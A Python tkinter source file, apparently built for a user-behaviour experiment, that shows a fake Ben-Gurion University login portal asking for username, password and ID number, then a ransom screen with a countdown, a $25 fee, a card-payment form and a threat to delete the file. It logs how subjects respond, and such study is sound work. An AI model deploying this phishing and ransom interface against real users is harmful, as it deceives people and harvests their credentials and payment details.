import tkinter as tk
from tkinter import messagebox
import os
import time
import queue
from Functions import decrypt_file

COUNTDOWN_SECONDS = 10*60
window_closure_method = "User"

#----------------------------------------------------------------------------------------------------#

# Displaying the countdown timer in the ransomware window.

def start_countdown(label, seconds, window):
    def countdown(remaining):
        if remaining <= 0:
            global window_closure_method
            window_closure_method = "Timeout"
            window.destroy()
        else:
            mins, secs = divmod(remaining, 60)
            label.config(text=f"Time remaining: {mins:02}:{secs:02}")
            label.after(1000, countdown, remaining - 1)
    countdown(seconds)

#----------------------------------------------------------------------------------------------------#

def display_ransomware_message(file_path, email_address_queue, main_window):

    #----------------------------------------------------------------------------------------------------#

    window = tk.Toplevel(main_window)
    window.title("Ransom Message")
    window.geometry("525x410")
    window.resizable(False, False)
    window.configure(bg="#f0f0f0")

    start_time = time.time()

    payment_first_call = True
    decryption_first_call = True
    help_first_call = True

    payment_elapsed_time = None
    decryption_elapsed_time = None
    help_elapsed_time = None

    payment_attempts = 0
    decryption_attempts = 0

    #----------------------------------------------------------------------------------------------------#

    def destroy():
        window.destroy()
        main_window.destroy()

    window.protocol("WM_DELETE_WINDOW", destroy)

    #----------------------------------------------------------------------------------------------------#

    # Displaying the payment window.

    def open_payment_form():

        payment_window = tk.Toplevel(window)
        payment_window.title("Secure Payment")
        payment_window.geometry("350x275")
        payment_window.configure(bg="#f0f0f0")

        tk.Label(payment_window, text="Card Number:", font=("Arial", 10), bg="#f0f0f0").pack(pady=5)
        card_entry = tk.Entry(payment_window, width=30)
        card_entry.pack()

        tk.Label(payment_window, text="Expiry Date (MM/YY):", font=("Arial", 10), bg="#f0f0f0").pack(pady=5)
        expiry_entry = tk.Entry(payment_window, width=15)
        expiry_entry.pack()

        tk.Label(payment_window, text="CVV:", font=("Arial", 10), bg="#f0f0f0").pack(pady=5)
        cvv_entry = tk.Entry(payment_window, width=5, show="*")
        cvv_entry.pack()

        tk.Label(payment_window, text="Cardholder Name:", font=("Arial", 10), bg="#f0f0f0").pack(pady=5)
        name_entry = tk.Entry(payment_window, width=30)
        name_entry.pack()

        def submit_payment():

            global window_closure_method
            nonlocal payment_attempts, payment_first_call, payment_elapsed_time

            payment_attempts = payment_attempts + 1

            if payment_first_call:
                payment_first_call = False
                payment_elapsed_time = int(round(time.time() - start_time))

            if card_entry.get().isdigit() and len(card_entry.get()) == 16 and cvv_entry.get().isdigit() and len(cvv_entry.get()) == 3:
                
                messagebox.showinfo("Success", "Payment accepted.")

                window_closure_method = "Payment"

                payment_window.destroy()
                window.destroy()
                main_window.destroy()
            else:

                messagebox.showerror("Failure", "Payment declined.")


        tk.Button(payment_window, text="Pay", command=submit_payment, bg="#d1ecf1", fg="black").pack(pady=10)

        payment_window.grab_set()
        window.wait_window(payment_window) 

    #----------------------------------------------------------------------------------------------------#

    # Displaying the Helpdesk contact window.

    def open_help_form():

        help_window = tk.Toplevel(window)
        help_window.title("Assistance Request")
        help_window.geometry("350x200")
        help_window.configure(bg="#f0f0f0")

        tk.Label(help_window, 
            text="Please enter your email address,\nand one of our representatives will get back to you\nas soon as possible.",
            font=("Arial", 10),
            bg="#f0f0f0").pack(pady=10)


        tk.Label(help_window, text="Email Address:", font=("Arial", 10), bg="#f0f0f0").pack(pady=5)
        email_address_entry = tk.Entry(help_window, width=30)
        email_address_entry.pack()

        def submit_help():

            nonlocal help_first_call, help_elapsed_time

            if payment_first_call:
                help_first_call = False
                help_elapsed_time = int(round(time.time() - start_time))

            email_address = email_address_entry.get()

            if not email_address.strip():
                messagebox.showerror("Error", "Please enter an email address.")
            else:
                email_address_queue.put(email_address)
                help_window.destroy()

        tk.Button(help_window, text="Send", command=submit_help, bg="#d1ecf1", fg="black").pack(pady=10)

        help_window.grab_set()
        window.wait_window(help_window) 
    
    #----------------------------------------------------------------------------------------------------#

    # Attempt to decrypt the file.

    def on_decrypt():

        global window_closure_method
        nonlocal decryption_attempts, decryption_first_call, decryption_elapsed_time

        decryption_attempts = decryption_attempts + 1

        if decryption_first_call:
            decryption_first_call = False
            decryption_elapsed_time = int(round(time.time() - start_time))
  
        key = key_entry.get()
        success = decrypt_file(file_path, key)

        if success:
            messagebox.showinfo("Success", "Correct decryption key.")
            window_closure_method = "Decryption"       
            window.destroy()
            main_window.destroy()
        else:
            messagebox.showerror("Failure", "Incorrect decryption key.")

    #----------------------------------------------------------------------------------------------------#
 
    tk.Label(window, 
             text="Your file has been encrypted!", 
             font=("Arial", 18, "bold"), 
             bg="#f0f0f0").pack(pady=20)

    tk.Label(window, 
             text=f"File: {os.path.basename(file_path)}",
             font=("Arial", 12, "bold"),
             bg="#f0f0f0").pack()

    tk.Label(window, 
             text="Enter your decryption key below to unlock it:", 
             font=("Arial", 10),
             bg="#f0f0f0").pack(pady=10)

    key_entry = tk.Entry(window, width=50)
    key_entry.pack()

    timer_label = tk.Label(window, 
                           font=("Arial", 16, "bold"), 
                           bg="#f0f0f0")
    
    timer_label.pack(pady=(20,5))

    tk.Label(window, 
            text="The decryption fee for the file is set at $25.", 
            font=("Arial", 10),
            bg="#f0f0f0").pack(pady=5)
    
    tk.Button(window, 
             text="Decrypt File", 
             command=on_decrypt,
             bg="#f8d7da",
             fg="black").pack(pady=5)

    tk.Button(window, 
             text="Pay with Credit Card", 
             command=open_payment_form,
             bg="#d4edda",
             fg="black").pack(pady=5)
    
    tk.Button(window, 
            text="Ask for help", 
            command=open_help_form,
            bg="#fff3cd",  
            fg="black").pack(pady=5)
    
    start_countdown(timer_label, COUNTDOWN_SECONDS, window)

    tk.Label(window,
             text="(Warning: If you close this window or let the timer reach zero,\nthe file will be deleted from your computer)",
             font=("Arial", 10, "italic"),
             bg="#f0f0f0").pack(pady=10)

    #----------------------------------------------------------------------------------------------------#

    window.mainloop()
    return decryption_attempts, payment_attempts, decryption_elapsed_time, payment_elapsed_time, help_elapsed_time

#----------------------------------------------------------------------------------------------------#

def display_trojan_horse(file_path_queue, email_address_queue):

    main_window = tk.Tk()
    main_window.title("Ben-Gurion University of the Negev Portal")
    main_window.geometry("600x450")
    main_window.configure(bg="#e8eaf6")
    main_window.resizable(False, False)

    main_window.protocol("WM_DELETE_WINDOW", lambda: None)
 
    decryption_attempts = None
    payment_attempts = None

    decryption_elapsed_time = None
    payment_elapsed_time = None
    help_elapsed_time = None
    
    is_personal_information_provided = "No"

    #----------------------------------------------------------------------------------------------------#

    # Checking whether a file was selected and successfully encrypted.

    start_time = time.time()

    def check_message_queue():
        nonlocal decryption_attempts, payment_attempts, decryption_elapsed_time, payment_elapsed_time, help_elapsed_time, start_time

        if time.time() - start_time > 3*60: # 3 minutes
            main_window.destroy()

        try:
            file_path = file_path_queue.get_nowait() 
            main_window.protocol("WM_DELETE_WINDOW", main_window.destroy) 
            decryption_attempts, payment_attempts, decryption_elapsed_time, payment_elapsed_time, help_elapsed_time = display_ransomware_message(file_path, email_address_queue, main_window)

        except queue.Empty:
            main_window.after(200, check_message_queue)  

    check_message_queue()

    #----------------------------------------------------------------------------------------------------#

    username_var = tk.StringVar()
    password_var = tk.StringVar()
    identification_var = tk.StringVar()

    def handle_submit():

        username = username_var.get()
        password = password_var.get()
        identification = identification_var.get()

        if not username or not password or not identification:          
            messagebox.showwarning("Missing Fields", "Please fill in all the required fields.")
            return
               
        nonlocal is_personal_information_provided
        is_personal_information_provided = "Yes"
          
        main_window.username = username
        main_window.password = password
        main_window.identification = identification

        username_entry.config(state="disabled")
        password_entry.config(state="disabled")
        identification_entry.config(state="disabled")

        submit_btn.config(text="Connecting", state="disabled")

        messagebox.showinfo("Server Connection", "Establishing a secure connection to the university servers.\nThis process may take a while. Please be patient.")

    #----------------------------------------------------------------------------------------------------#

    main_frame = tk.Frame(main_window, bg="white", bd=1, relief="solid")
    main_frame.place(relx=0.5, rely=0.5, anchor="center", width=500, height=400)

    title = tk.Label(main_frame, text="Welcome to the Apollo System", font=("Segoe UI", 18, "bold"), bg="white", fg="#2c3e50")
    title.pack(pady=(25, 10))

    subtitle = tk.Label(main_frame, text="Start the tracking process by filling out the form below",
                        font=("Segoe UI", 10), bg="white", fg="#555555")
    subtitle.pack(pady=(0, 20))

    def add_labeled_entry(parent, label_text, variable, show=None):
        tk.Label(parent, text=label_text, font=("Segoe UI", 10, "bold"), bg="white", anchor="w", fg="#2c3e50").pack(fill="x", padx=40)
        entry = tk.Entry(parent, textvariable=variable, font=("Segoe UI", 11), show=show, relief="solid", bd=1)
        entry.pack(fill="x", padx=40, pady=(5, 15))
        return entry

    username_entry = add_labeled_entry(main_frame, "Username:", username_var)
    password_entry = add_labeled_entry(main_frame, "Password:", password_var, show="*")
    identification_entry = add_labeled_entry(main_frame, "ID Number:", identification_var)

    submit_btn = tk.Button(main_frame, text="Login",
                        font=("Segoe UI", 11, "bold"),
                        bg="#3b5998", fg="white",
                        relief="flat", command=handle_submit)
    submit_btn.pack(fill="x", padx=40, pady=(10, 20))

    #----------------------------------------------------------------------------------------------------#

    main_window.mainloop()
    return decryption_attempts, payment_attempts, decryption_elapsed_time, payment_elapsed_time, help_elapsed_time, is_personal_information_provided, window_closure_method